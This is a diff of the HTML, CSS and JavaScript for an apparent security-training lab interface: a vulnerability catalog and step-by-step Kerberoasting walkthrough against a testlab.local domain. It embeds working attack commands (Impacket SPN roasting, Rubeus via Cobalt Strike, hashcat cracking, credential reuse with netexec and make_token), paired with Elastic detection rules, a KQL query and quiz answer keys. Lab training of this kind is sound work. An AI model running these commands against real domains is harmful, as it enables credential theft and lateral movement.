+        .bw-det__cov--partial { background: var(--warning-bg); color: var(--warning-text); border: 1px solid var(--warning-border); }
+        .bw-det__cov--norule { background: var(--danger-bg); color: var(--danger-text); border: 1px solid var(--danger-border); }
+
+        .bw-det__table {
+            width: 100%;
+            border-collapse: separate; border-spacing: 0;
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-sm);
+            overflow: hidden;
+            font-size: 12px;
+        }
+        .bw-det__table thead tr {
+            background: var(--bg-section);
+        }
+        .bw-det__table th {
+            text-align: left;
+            padding: 9px 12px;
+            font-family: var(--font-family-mono);
+            font-size: 9.5px; font-weight: 700;
+            color: var(--text-secondary);
+            letter-spacing: 0.1em; text-transform: uppercase;
+            border-bottom: 1px solid var(--border-subtle);
+        }
+        .bw-det__table td {
+            padding: 10px 12px;
+            border-bottom: 1px solid var(--border-subtle);
+            color: var(--text-primary);
+            vertical-align: top;
+        }
+        .bw-det__table tr:last-child td { border-bottom: 0; }
+        .bw-det__table tr:nth-child(even) td { background: color-mix(in srgb, var(--bg-card) 96%, var(--text-secondary) 4%); }
+        .bw-det__uuid { font-family: var(--font-family-mono); font-size: 10.5px; color: var(--text-secondary); }
+        .bw-det__link-cell { display: flex; align-items: center; gap: 6px; }
+        .bw-det__link {
+            color: var(--guide-accent-text);
+            text-decoration: underline;
+            text-underline-offset: 3px;
+            font-family: var(--font-family-mono);
+            font-size: 11px;
+        }
+        .bw-det__link:hover { color: color-mix(in srgb, var(--guide-accent-text) 80%, white); }
+        .bw-det__copy {
+            appearance: none;
+            background: transparent;
+            border: 1px solid var(--border-subtle);
+            color: var(--text-secondary);
+            font-family: var(--font-family-mono);
+            font-size: 9.5px; font-weight: 600;
+            letter-spacing: 0.06em; text-transform: uppercase;
+            padding: 2px 6px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: border-color var(--motion-duration-base) var(--motion-ease-walk),
+                        color var(--motion-duration-base) var(--motion-ease-walk);
+        }
+        .bw-det__copy:hover { border-color: var(--guide-accent); color: var(--guide-accent-text); }
+        .bw-det__copy.is-copied { border-color: var(--success-border); color: var(--success-text); }
+
+        .bw-det__kql {
+            margin: 22px 0 0;
+        }
+        .bw-det__kql-head {
+            display: block;
+            font-family: var(--font-family-mono);
+            font-size: 10px; font-weight: 700;
+            color: var(--text-secondary);
+            letter-spacing: 0.1em; text-transform: uppercase;
+            margin: 0 0 6px;
+        }
+
+        /* ── INSTALL TAB ────────────────────────────────────────────── */
+        .bw-install { max-width: 600px; }
+        .bw-install__card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius);
+            padding: 18px 20px;
+            margin-bottom: 14px;
+        }
+        .bw-install__state {
+            display: inline-flex; align-items: center; gap: 7px;
+            padding: 5px 12px;
+            border-radius: 999px;
+            font-family: var(--font-family-mono);
+            font-size: 11px; font-weight: 700;
+            letter-spacing: 0.08em; text-transform: uppercase;
+            margin-bottom: 12px;
+        }
+        .bw-install__state--not { background: var(--bg-card-hover); color: var(--text-secondary); border: 1px solid var(--border-subtle); }
+        .bw-install__state--installing { background: var(--warning-bg); color: var(--warning-text); border: 1px solid var(--warning-border); }
+        .bw-install__state--installed { background: var(--success-bg); color: var(--success-text); border: 1px solid var(--success-border); }
+        .bw-install__state-dot {
+            width: 7px; height: 7px; border-radius: 50%;
+            background: currentColor;
+        }
+        .bw-install__state--installing .bw-install__state-dot { animation: bw-pulse 1.4s ease-in-out infinite; }
+        @keyframes bw-pulse {
+            0%, 100% { opacity: 0.4; transform: scale(0.85); }
+            50% { opacity: 1; transform: scale(1.1); }
+        }
+
+        .bw-install__bar {
+            height: 4px;
+            background: var(--bg-card-hover);
+            border-radius: 999px;
+            overflow: hidden;
+            margin: 10px 0 12px;
+        }
+        .bw-install__bar-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--guide-accent);
+            border-radius: 999px;
+            transition: width 1.5s linear;
+        }
+        .bw-install__info {
+            font-size: 13px; line-height: 1.55; color: var(--text-primary);
+            margin: 0 0 14px;
+        }
+        .bw-install__info-row {
+            display: flex; justify-content: space-between; gap: 10px;
+            font-family: var(--font-family-mono); font-size: 11px;
+            padding: 4px 0;
+            border-bottom: 1px dashed color-mix(in srgb, var(--border-subtle) 60%, transparent);
+        }
+        .bw-install__info-row:last-child { border-bottom: 0; }
+        .bw-install__info-row .k { color: var(--text-secondary); letter-spacing: 0.04em; }
+        .bw-install__info-row .v { color: var(--text-primary); }
+
+        /* ── TOAST ──────────────────────────────────────────────────── */
+        .bw-toast {
+            position: fixed;
+            bottom: 28px;
+            left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            background: var(--bg-section);
+            border: 1px solid var(--guide-accent);
+            color: var(--text-primary);
+            padding: 9px 16px;
+            border-radius: 6px;
+            font-family: var(--font-family-mono);
+            font-size: 11.5px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            opacity: 0;
+            pointer-events: none;
+            z-index: 1000;
+            transition: opacity 220ms var(--motion-ease-walk),
+                        transform 220ms var(--motion-ease-walk);
+        }
+        .bw-toast.is-visible {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        /* ── KEYBOARD MODAL ─────────────────────────────────────────── */
+        .bw-kbd-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.65);
+            display: flex; align-items: center; justify-content: center;
+            z-index: 999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 220ms var(--motion-ease-walk);
+        }
+        .bw-kbd-modal.is-open {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .bw-kbd-modal__card {
+            background: var(--bg-section);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius);
+            padding: 22px 26px;
+            max-width: 440px;
+            width: calc(100% - 40px);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            transform: translateY(10px);
+            transition: transform 240ms var(--motion-ease-walk);
+        }
+        .bw-kbd-modal.is-open .bw-kbd-modal__card { transform: translateY(0); }
+        .bw-kbd-modal__title {
+            font-size: 14px; font-weight: 700; margin: 0 0 4px;
+            color: var(--text-primary);
+        }
+        .bw-kbd-modal__sub {
+            font-family: var(--font-family-mono); font-size: 11px;
+            color: var(--text-secondary); margin: 0 0 16px;
+        }
+        .bw-kbd-modal__list {
+            display: grid;
+            grid-template-columns: auto 1fr;
+            gap: 10px 16px;
+            margin: 0 0 16px;
+            font-size: 12px;
+            color: var(--text-primary);
+        }
+        .bw-kbd-modal__list kbd {
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: 4px;
+            padding: 2px 8px;
+            font-family: var(--font-family-mono);
+            font-size: 10.5px;
+            color: var(--text-primary);
+            display: inline-block;
+            min-width: 22px;
+            text-align: center;
+        }
+        .bw-kbd-modal__close {
+            appearance: none;
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            color: var(--text-primary);
+            font-family: var(--font-family-mono); font-size: 11px;
+            letter-spacing: 0.08em; text-transform: uppercase; font-weight: 600;
+            padding: 6px 12px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .bw-kbd-modal__close:hover { border-color: var(--guide-accent); }
+
+        /* Step transition (motion=6) — short fade+slide */
+        .bw-step-anim {
+            animation: bw-step-in 280ms var(--motion-ease-walk);
+        }
+        @keyframes bw-step-in {
+            from { opacity: 0; transform: translateY(6px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
 
         @media (prefers-reduced-motion: reduce) {
             *, *::before, *::after {
@@ -496,6 +1217,7 @@
                 transition-duration: 0.001ms !important;
             }
             .bw-cat__row:hover { transform: none; }
+            .bw-handle__grip { transform: none; }
         }
     </style>
 </head>
@@ -582,217 +1304,1979 @@
 
         <span class="demo-label">
             <span class="demo-label__dot" aria-hidden="true"></span>
-            C — Split panel (catalog + walkthrough)
+            C — Split panel (interactive)
         </span>
 
         <!-- ════════════════════════════════════════════════════════════
-             C-SPECIFIC: 38% catalog | 62% walkthrough
+             SPLIT: catalog | handle | walkthrough
              ════════════════════════════════════════════════════════════ -->
-        <div class="bw-split">
-            <!-- LEFT: catalog pane (independent scroll) -->
+        <div class="bw-split" id="bw-split">
+            <!-- LEFT: catalog pane -->
             <aside class="bw-cat" aria-label="Bolt-on catalog">
                 <div class="bw-cat__head">
                     <div class="bw-cat__eyebrow">Vulnerability catalog</div>
                     <h2 class="bw-cat__title">Bolt-on browser</h2>
-                    <div class="bw-cat__host">
-                        <span class="bw-cat__host-dot" aria-hidden="true"></span>
-                        <span class="bw-cat__host-name">tldc01.testlab.local</span>
-                        <span class="bw-cat__host-sub">DC · WS22</span>
+                    <div class="bw-cat__controls">
+                        <input
+                            id="catSearch"
+                            class="bw-cat__search"
+                            type="search"
+                            placeholder="Search vulns by name…"
+                            autocomplete="off"
+                            spellcheck="false">
+                        <select id="catHost" class="bw-cat__host" aria-label="Host filter">
+                            <option value="all">All hosts</option>
+                            <option value="tldc01">tldc01.testlab.local</option>
+                            <option value="tlms01">tlms01.testlab.local</option>
+                            <option value="tlws01">tlws01.testlab.local</option>
+                        </select>
                     </div>
                 </div>
 
-                <div class="bw-cat__chips">
-                    <button class="bw-cat__chip is-active" type="button">All</button>
-                    <button class="bw-cat__chip" type="button">AD attack</button>
-                    <button class="bw-cat__chip" type="button">Linux</button>
-                    <button class="bw-cat__chip" type="button">Persistence</button>
+                <div class="bw-cat__chips" id="catChips">
+                    <button class="bw-cat__chip is-active" type="button" data-cat="all">All</button>
+                    <button class="bw-cat__chip" type="button" data-cat="identity-kerberos">AD Identity</button>
+                    <button class="bw-cat__chip" type="button" data-cat="adcs">ADCS</button>
+                    <button class="bw-cat__chip" type="button" data-cat="acl">AD ACL</button>
+                    <button class="bw-cat__chip" type="button" data-cat="known-cve">Known CVE</button>
+                    <button class="bw-cat__chip" type="button" data-cat="protocol-network">Network</button>
                 </div>
 
-                <ul class="bw-cat__list">
-                    <li class="bw-cat__row is-selected">
-                        <div>
-                            <div class="bw-cat__row-title">Kerberoasting — SPN-to-shell on TESTLAB</div>
-                            <div class="bw-cat__row-id">bolton.identity-kerberos.kerberoastable-svc</div>
-                            <div class="bw-cat__row-pills">
-                                <span class="bw-pill">Identity</span>
-                                <span class="bw-pill">T1558.003</span>
-                                <span class="bw-pill bw-pill--success">Installed</span>
-                            </div>
-                        </div>
-                        <div class="bw-cat__row-status">Step 1/6</div>
-                    </li>
-                    <li class="bw-cat__row">
-                        <div>
-                            <div class="bw-cat__row-title">AS-REP Roastable User</div>
-                            <div class="bw-cat__row-id">bolton.identity-kerberos.asrep-roast</div>
-                            <div class="bw-cat__row-pills">
-                                <span class="bw-pill">Identity</span>
-                                <span class="bw-pill">T1558.004</span>
-                                <span class="bw-pill bw-pill--success">Covered</span>
-                            </div>
-                        </div>
-                        <div class="bw-cat__row-status">Installable</div>
-                    </li>
-                    <li class="bw-cat__row">
-                        <div>
-                            <div class="bw-cat__row-title">ESC1 — Misconfigured cert template</div>
-                            <div class="bw-cat__row-id">bolton.adcs.esc1-enrollee-supplies</div>
-                            <div class="bw-cat__row-pills">
-                                <span class="bw-pill">ADCS</span>
-                                <span class="bw-pill">T1649</span>
-                                <span class="bw-pill bw-pill--warn">Partial</span>
-                            </div>
-                        </div>
-                        <div class="bw-cat__row-status">Missing prereq</div>
-                    </li>
-                    <li class="bw-cat__row">
-                        <div>
-                            <div class="bw-cat__row-title">Unconstrained delegation on workstation</div>
-                            <div class="bw-cat__row-id">bolton.delegation.unconstrained-ws</div>
-                            <div class="bw-cat__row-pills">
-                                <span class="bw-pill">Delegation</span>
-                                <span class="bw-pill">T1558.001</span>
-                                <span class="bw-pill bw-pill--danger">No rule</span>
-                            </div>
-                        </div>
-                        <div class="bw-cat__row-status">Installable</div>
-                    </li>
-                    <li class="bw-cat__row">
-                        <div>
-                            <div class="bw-cat__row-title">PrintNightmare — CVE-2021-34527</div>
-                            <div class="bw-cat__row-id">bolton.cve.printnightmare</div>
-                            <div class="bw-cat__row-pills">
-                                <span class="bw-pill">CVE</span>
-                                <span class="bw-pill">T1068</span>
-                                <span class="bw-pill bw-pill--success">Covered</span>
-                            </div>
-                        </div>
-                        <div class="bw-cat__row-status">Installable</div>
-                    </li>
-                    <li class="bw-cat__row">
-                        <div>
-                            <div class="bw-cat__row-title">WriteDACL on Domain Object</div>
-                            <div class="bw-cat__row-id">bolton.acl.write-dacl-domain</div>
-                            <div class="bw-cat__row-pills">
-                                <span class="bw-pill">ACL</span>
-                                <span class="bw-pill">T1098</span>
-                                <span class="bw-pill bw-pill--warn">Partial</span>
-                            </div>
-                        </div>
-                        <div class="bw-cat__row-status">Missing software</div>
-                    </li>
-                    <li class="bw-cat__row">
-                        <div>
-                            <div class="bw-cat__row-title">CVE-2022-26923 — Certifried</div>
-                            <div class="bw-cat__row-id">bolton.adcs.certifried-26923</div>
-                            <div class="bw-cat__row-pills">
-                                <span class="bw-pill">ADCS</span>
-                                <span class="bw-pill">T1078</span>
-                                <span class="bw-pill bw-pill--success">Covered</span>
-                            </div>
-                        </div>
-                        <div class="bw-cat__row-status">Installable</div>
-                    </li>
-                    <li class="bw-cat__row">
-                        <div>
-                            <div class="bw-cat__row-title">SCCM PXE boot password recovery</div>
-                            <div class="bw-cat__row-id">bolton.sccm.pxe-boot-recovery</div>
-                            <div class="bw-cat__row-pills">
-                                <span class="bw-pill">SCCM</span>
-                                <span class="bw-pill">T1187</span>
-                                <span class="bw-pill bw-pill--danger">No rule</span>
-                            </div>
-                        </div>
-                        <div class="bw-cat__row-status">Installable</div>
-                    </li>
+                <ul class="bw-cat__list" id="catList">
+                    <!-- populated by JS -->
                 </ul>
             </aside>
 
-            <!-- RIGHT: walkthrough pane (independent scroll) -->
-            <section class="bw-walk" aria-label="Walkthrough">
-                <header class="bw-walk__head">
-                    <div class="bw-walk__head-row">
-                        <div class="bw-walk__head-text">
-                            <span class="bw-eyebrow">Bolt-on walkthrough · TESTLAB</span>
-                            <h1 class="bw-title">Kerberoasting — SPN-to-shell on TESTLAB</h1>
-                            <p class="bw-subtitle">bolton.identity-kerberos.kerberoastable-svc · target <strong>tldc01.testlab.local</strong></p>
-                        </div>
-                        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:6px;">
-                            <span class="bw-dots" aria-label="Step 1 of 6">
-                                <span class="bw-dot is-current" aria-hidden="true"></span>
-                                <span class="bw-dot" aria-hidden="true"></span>
-                                <span class="bw-dot" aria-hidden="true"></span>
-                                <span class="bw-dot" aria-hidden="true"></span>
-                                <span class="bw-dot" aria-hidden="true"></span>
-                                <span class="bw-dot" aria-hidden="true"></span>
-                            </span>
-                            <span class="bw-dots__label" style="margin-left:0;">Step 1 of 6</span>
+            <!-- Drag handle -->
+            <div class="bw-handle" id="bwHandle" role="separator" aria-label="Resize panels" aria-orientation="vertical" tabindex="0">
+                <span class="bw-handle__grip" aria-hidden="true">
+                    <span></span><span></span><span></span>
+                </span>
+            </div>
+
+            <!-- RIGHT: walkthrough pane -->
+            <section class="bw-walk" aria-label="Walkthrough" id="bwWalk">
+                <!-- Step rail (left of walkthrough body) -->
+                <nav class="bw-rail" aria-label="Step list" id="stepRail">
+                    <div class="bw-rail__head">Steps</div>
+                    <ul class="bw-rail__list" id="stepRailList">
+                        <!-- populated by JS -->
+                    </ul>
+                    <div class="bw-rail__foot">
+                        <button id="resetProgress" class="bw-rail__reset" type="button">↻ Reset progress</button>
+                        <div class="bw-rail__kbd-hint">
+                            <kbd>←</kbd> <kbd>→</kbd> nav · <kbd>Space</kbd> mark · <kbd>Esc</kbd> back · <kbd>?</kbd> help
                         </div>
                     </div>
+                </nav>
 
-                    <nav class="bw-tabs" role="tablist">
-                        <button class="bw-tab is-active" type="button" role="tab" aria-selected="true">Walkthrough</button>
-                        <button class="bw-tab" type="button" role="tab">Detections</button>
-                        <button class="bw-tab" type="button" role="tab">Install</button>
-                    </nav>
-                </header>
-
-                <div class="bw-walk__body">
-                    <article class="bw-article">
-                        <div class="bw-article__head">
-                            <span class="bw-article__eyebrow">Step 1 · Enumeration</span>
-                            <span class="bw-article__time">≈ 5 min</span>
-                        </div>
-                        <h2 class="bw-article__title">Enumerate Service Principal Names on testlab.local</h2>
-                        <p>
-                            Operating as <code>TESTLAB\jdoe</code> on <code>tlws01</code> (10.99.50.12).
-                            The target SPN sits on <code>tldc01</code> (10.99.50.10) — request a TGS
-                            for any registered service account to expose an RC4 hash crackable offline.
-                        </p>
-                        <pre><code>GetUserSPNs.py testlab.local/jdoe:Welcome1! -dc-ip 10.99.50.10 -request</code></pre>
-                        <p><strong>Expected output:</strong></p>
-                        <pre><code>MSSQLSvc/tlms01.testlab.local:1433 → svc_kerb</code></pre>
-
-                        <div class="bw-article__callout">
-                            <span class="bw-article__callout-eyebrow">Cobalt Strike BOF alternative</span>
-                            <p>
-                                If the beacon is already on <code>tlws01</code>, skip Impacket and run the
-                                in-process BOF instead — no Python, no PowerShell, no on-disk artifact:
-                            </p>
-                            <pre><code>inline-execute /opt/cobalt-tools/inline_kerberoast.x64.o</code></pre>
-                            <p>
-                                Source: <a href="https://github.com/trustedsec/CS-Situational-Awareness-BOF" rel="noopener">trustedsec/CS-Situational-Awareness-BOF</a>
-                            </p>
-                        </div>
-
-                        <blockquote class="bw-article__quote">
-                            <strong>Detection that should fire:</strong> Elastic rule
-                            <code>Kerberoasting via Unusual Process</code> (rule UUID
-                            <code>1c01…</code>). Confirm in the Detections tab after the next step.
-                        </blockquote>
-
-                        <section class="bw-quiz">
-                            <h3 class="bw-quiz__heading">Assessment</h3>
-                            <p class="bw-quiz__q">Why does <code>GetUserSPNs</code> request a TGS for the discovered SPN?</p>
-                            <div class="bw-quiz__opts">
-                                <button class="bw-quiz__opt" type="button"><span class="bw-quiz__opt-marker">A</span> It elevates the requesting user to that service's privileges.</button>
-                                <button class="bw-quiz__opt" type="button"><span class="bw-quiz__opt-marker">B</span> It triggers RC4 TGS issuance which exposes the service account NTLM hash for offline cracking.</button>
-                                <button class="bw-quiz__opt" type="button"><span class="bw-quiz__opt-marker">C</span> It validates that the SPN points to a real service before attempting any exploit.</button>
-                                <button class="bw-quiz__opt" type="button"><span class="bw-quiz__opt-marker">D</span> It forces the KDC to log the request so blue-team detection can be tested.</button>
-                            </div>
-                        </section>
-
-                        <footer class="bw-foot">
-                            <span class="bw-foot__hint">Pick a row on the left to switch walkthroughs</span>
-                            <div style="display:inline-flex;gap:8px;">
-                                <button class="bw-btn" type="button">✓ Mark complete</button>
-                                <button class="bw-btn bw-btn--primary" type="button">⏵ Next: Request the TGS</button>
-                            </div>
-                        </footer>
-                    </article>
+                <!-- Walkthrough body column -->
+                <div class="bw-body-col" id="bodyCol">
+                    <!-- header + body injected -->
                 </div>
             </section>
         </div>
     </div>
+
+    <!-- Toast -->
+    <div id="bwToast" class="bw-toast" role="status" aria-live="polite"></div>
+
+    <!-- Keyboard modal -->
+    <div id="bwKbdModal" class="bw-kbd-modal" aria-hidden="true">
+        <div class="bw-kbd-modal__card" role="dialog" aria-labelledby="kbdModalTitle">
+            <h3 id="kbdModalTitle" class="bw-kbd-modal__title">Keyboard shortcuts</h3>
+            <p class="bw-kbd-modal__sub">Walkthrough navigation</p>
+            <dl class="bw-kbd-modal__list">
+                <dt><kbd>←</kbd></dt><dd>Previous step</dd>
+                <dt><kbd>→</kbd></dt><dd>Next step</dd>
+                <dt><kbd>Space</kbd></dt><dd>Toggle mark complete on current step</dd>
+                <dt><kbd>Esc</kbd></dt><dd>Back to catalog (clears walkthrough)</dd>
+                <dt><kbd>?</kbd></dt><dd>Open this shortcut help</dd>
+            </dl>
+            <button class="bw-kbd-modal__close" type="button" id="kbdModalClose">Close</button>
+        </div>
+    </div>
+
+<script>
+/* ═══════════════════════════════════════════════════════════════════════
+   STATE + DATA
+   ═══════════════════════════════════════════════════════════════════════ */
+
+const LS_STATE = 'boltonPreviewState';
+const LS_SPLIT = 'boltonSplitRatio';
+const DEFAULT_RATIO = 0.38;
+
+// ─── VULN DATA ─────────────────────────────────────────────────────────
+const VULNS = [
+    {
+        id: 'bolton.identity-kerberos.kerberoastable-svc',
+        slug: 'kerberoastable-svc',
+        category: 'identity-kerberos',
+        host: 'tldc01',
+        name: 'Kerberoasting — SPN-to-shell on TESTLAB',
+        title: 'Kerberoasting — SPN-to-shell on TESTLAB',
+        target: 'tldc01.testlab.local',
+        labelHost: 'tldc01 · DC · WS22',
+        pills: [
+            { text: 'AD Identity', cls: '' },
+            { text: 'T1558.003', cls: '' },
+            { text: 'Installed', cls: 'bw-pill--success' },
+        ],
+        detection: {
+            coverage: 'covered',
+            rules: [
+                {
+                    name: 'Kerberoasting, Unusual Process Behavior',
+                    uuid: '897dc6b5-b39f-432a-8d75-d3730d50c782',
+                    coverage: 'full',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_kerberoasting_unusual_process.toml',
+                },
+                {
+                    name: 'Service Principal Name (SPN) Attribute Modified',
+                    uuid: '0b2f3da5-b5ec-47d1-908b-6ebb74814289',
+                    coverage: 'indirect',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_spn_attribute_modified.toml',
+                },
+                {
+                    name: 'User Account Creation',
+                    uuid: '1aa9181a-492b-4c01-8b16-fa0735786b2b',
+                    coverage: 'indirect',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/persistence_user_account_creation.toml',
+                },
+            ],
+            kql: 'event.code:4769 AND winlog.event_data.TicketEncryptionType:"0x17" AND winlog.event_data.ServiceName:"svc_kerb*"',
+        },
+        install: {
+            ansibleRole: 'bolton_kerberoastable_svc',
+            estSeconds: 30,
+            detectability: 'quiet',
+            sideEffects: 'Creates svc_kerb AD user with weak password',
+        },
+        steps: [
+            {
+                id: '01-discover-spns',
+                title: 'Enumerate Service Principal Names on testlab.local',
+                eyebrow: 'Step 1 · Enumeration',
+                est: 5,
+                intro: 'A registered SPN on a <em>user</em> (not computer) account is the Kerberoasting precondition. Any authenticated TESTLAB user can query LDAP for them. Operating as <code>TESTLAB\\j.doe</code> on <code>tlws01</code> (10.99.50.12). The target SPN sits on <code>tldc01</code> (10.99.50.10) — request a TGS for any registered service account to expose an RC4 hash crackable offline.',
+                commands: [
+                    {
+                        label: 'Option A — Impacket from Kali (no beacon traffic)',
+                        lang: 'bash',
+                        cmd: "GetUserSPNs.py TESTLAB.LOCAL/j.doe:'Welcome1!' -dc-ip 10.99.50.10 -request",
+                    },
+                ],
+                output: "ServicePrincipalName                       Name      PasswordLastSet\n-----------------------------------------  --------  ---------------\nMSSQLSvc/tlms01.testlab.local:1433         svc_kerb  2025-08-12\nHTTP/tlms01.testlab.local                  svc_kerb  2025-08-12",
+                bof: {
+                    intro: 'If the beacon is already on <code>tlws01</code>, skip Impacket and run the in-process BOF — no Python, no PowerShell, no on-disk artifact.',
+                    cmd: 'inline-execute /opt/CS-Situational-Awareness-BOF/SA/get_spns/get_spns.x64.o',
+                    repo: { name: 'trustedsec/CS-Situational-Awareness-BOF', url: 'https://github.com/trustedsec/CS-Situational-Awareness-BOF' },
+                },
+                detect: '<strong>Elastic rule that fires:</strong> none — pure LDAP queries by an authenticated user are baseline. The blue team\'s signal starts in step 2.',
+                assessment: {
+                    question: 'Why is a registered SPN on a USER account dangerous, when a registered SPN on a COMPUTER account is benign?',
+                    options: [
+                        'Computer accounts have weak default passwords; user accounts have strong ones.',
+                        'Computer accounts auto-rotate passwords every 30 days with 240-bit random values; user-account passwords are human-set and typically far shorter / lower entropy.',
+                        'Kerberos refuses to issue TGS for computer-account SPNs.',
+                        'Computer accounts cannot be requested as service tickets at all.',
+                    ],
+                    correctIndex: 1,
+                    explanation: 'Both can be Kerberoasted — anyone can request a TGS for any SPN. The difference is crackability: computer accounts use a 240-bit cryptographically random password rotated every 30 days, while user accounts use whatever the admin typed in. Kerberoasting succeeds because of the password, not the protocol.',
+                },
+            },
+            {
+                id: '02-request-tgs',
+                title: 'Request the TGS for svc_kerb',
+                eyebrow: 'Step 2 · Roast',
+                est: 5,
+                intro: 'Kerberos lets ANY authenticated principal request a service ticket for ANY registered SPN — the KDC defers authorisation to the service. The TGS-REP body is encrypted with the service account\'s NT hash (RC4) or AES key (AES128/256).',
+                commands: [
+                    {
+                        label: 'Option A — Impacket from Kali',
+                        lang: 'bash',
+                        cmd: "GetUserSPNs.py TESTLAB.LOCAL/j.doe:'Welcome1!' \\\n    -dc-ip 10.99.50.10 \\\n    -request -outputfile /tmp/roast.hashes\ncat /tmp/roast.hashes",
+                    },
+                ],
+                output: '$krb5tgs$23$*svc_kerb$TESTLAB.LOCAL$MSSQLSvc/tlms01.testlab.local:1433*$5b3...$f6e...',
+                bof: {
+                    intro: 'Or use Rubeus.exe via execute-assembly — leaves no Python footprint on disk.',
+                    cmd: 'execute-assembly /opt/Rubeus/Rubeus.exe kerberoast /outfile:roast.hashes /nowrap',
+                    repo: { name: 'GhostPack/Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
+                },
+                detect: '<strong>Elastic rule fires:</strong> <code>Kerberoasting, Unusual Process Behavior</code> (UUID <code>897dc6b5-…</code>) — catches a TGS-REQ flow from an unusual host process. See the Detections tab.',
+            },
+            {
+                id: '03-crack-offline',
+                title: 'Crack the TGS-REP hash with hashcat mode 13100',
+                eyebrow: 'Step 3 · Crack',
+                est: 12,
+                intro: 'Modern DCs may pin to AES; verify the etype in the hash header. <code>$krb5tgs$23$</code> → mode <strong>13100</strong> (RC4-HMAC); <code>$17$</code> → mode 19600 (AES128); <code>$18$</code> → mode 19700 (AES256). The bolt-on sets <code>msDS-SupportedEncryptionTypes = 0x1C</code> which permits RC4, so you should land on mode 13100.',
+                commands: [
+                    {
+                        label: 'Hashcat — wordlist + best64 rules',
+                        lang: 'bash',
+                        cmd: "hashcat -m 13100 -a 0 /tmp/roast.hashes \\\n    /usr/share/wordlists/rockyou.txt \\\n    -r /usr/share/hashcat/rules/best64.rule \\\n    -O --status --status-timer=10",
+                    },
+                ],
+                output: 'Session..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)\nRecovered........: 1/1 (100.00%)\n\nsvc_kerb...:Summer2025!',
+                detect: '<strong>Elastic rule fires:</strong> none — cracking is offline, entirely on the attacker\'s host. Defenders cannot detect this step. That is why detection has to fire on step 2.',
+                assessment: {
+                    question: 'You captured a TGS-REP that starts with `$krb5tgs$18$*svc_kerb$...`. Which hashcat mode do you use?',
+                    options: [
+                        '13100 — Kerberos 5 TGS-REP etype 23 (RC4-HMAC)',
+                        '19600 — Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96)',
+                        '19700 — Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)',
+                        '18200 — Kerberos 5 AS-REP etype 23',
+                    ],
+                    correctIndex: 2,
+                    explanation: 'The `$18$` is the etype field — 18 = AES256-CTS-HMAC-SHA1-96, which maps to hashcat mode 19700. 13100 is etype 23 (RC4), 19600 is etype 17 (AES128), and 18200 is AS-REP roasting — a different attack with a different precondition (DONT_REQ_PREAUTH).',
+                },
+            },
+            {
+                id: '04-validate-impact',
+                title: 'Use the cracked credential — log in as svc_kerb',
+                eyebrow: 'Step 4 · Impact',
+                est: 6,
+                intro: 'A cracked hash is only useful if you can use it. Authenticate against tlms01 as svc_kerb to verify the password and assess what svc_kerb can actually reach.',
+                commands: [
+                    {
+                        label: 'Test SMB auth via netexec',
+                        lang: 'bash',
+                        cmd: "nxc smb 10.99.50.11 -u svc_kerb -p 'Summer2025!' -d testlab.local",
+                    },
+                    {
+                        label: 'Test MSSQL auth (svc_kerb is the SQL service account)',
+                        lang: 'bash',
+                        cmd: "impacket-mssqlclient TESTLAB/svc_kerb:'Summer2025!'@10.99.50.11",
+                    },
+                ],
+                output: 'SMB  10.99.50.11  445  TLMS01  [+] testlab.local\\svc_kerb:Summer2025! (Pwn3d!)',
+                bof: {
+                    intro: 'From the beacon on tlws01 you can <code>make_token</code> and laterally reuse the credential without dropping to Kali.',
+                    cmd: 'make_token TESTLAB\\svc_kerb Summer2025!',
+                },
+                detect: '<strong>Elastic rule fires:</strong> <code>Multiple Logon Failure Followed by Logon Success</code> may trigger if you typo the password; on success, the custom rule <code>Successful logon from svc_kerb in unusual context</code> is the signal defenders should run.',
+            },
+            {
+                id: '05-detection-mapping',
+                title: 'How the SOC sees the chain',
+                eyebrow: 'Step 5 · Detection',
+                est: 6,
+                intro: 'Three Elastic rules already mapped (see Detections tab). The highest-fidelity raw EVTX signal is <strong>Event 4769</strong> — TGS issued — filtered on <code>EncryptionType=0x17</code> (RC4) targeting an SPN that normally negotiates 0x12 (AES256).',
+                commands: [
+                    {
+                        label: 'Kibana DSL — high-fidelity Kerberoasting query',
+                        lang: 'kql',
+                        cmd: 'event.code:4769 AND\n  winlog.event_data.TicketEncryptionType:"0x17" AND\n  winlog.event_data.ServiceName:"svc_kerb*" AND\n  NOT winlog.event_data.IpAddress:("10.99.50.10" OR "10.99.50.11")',
+                    },
+                ],
+                detect: '<strong>Why this query:</strong> fires on TGS-REQs for svc_kerb encrypted as RC4 from a source that isn\'t a DC or the legitimate SQL host. Re-running step 2 produces this alert in your Elastic UI within ~60 seconds.',
+                assessment: {
+                    question: 'Defenders want one query to catch exploitation (not setup) of Kerberoasting against svc_kerb. Which EventID + filter is the highest-fidelity signal?',
+                    options: [
+                        '4720 — user account created',
+                        '5136 — DS object modified, attribute ServicePrincipalName',
+                        '4769 — TGS issued, ServiceName=svc_kerb, EncryptionType=0x17 (RC4)',
+                        '4624 — successful logon, LogonType=3',
+                    ],
+                    correctIndex: 2,
